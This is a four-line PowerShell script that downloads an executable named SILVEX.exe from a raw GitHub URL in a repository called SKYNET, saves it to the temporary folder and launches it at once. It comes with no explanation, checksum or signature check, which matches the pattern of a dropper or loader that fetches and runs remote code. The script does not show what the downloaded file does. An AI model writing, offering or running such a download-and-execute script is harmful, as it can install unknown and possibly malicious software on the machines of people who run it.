$url = "https://raw.githubusercontent.com/kittipatseepakdee-eng/SKYNET/refs/heads/main/SILVEX.exe"
$file = "$env:TEMP\SILVEX.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file
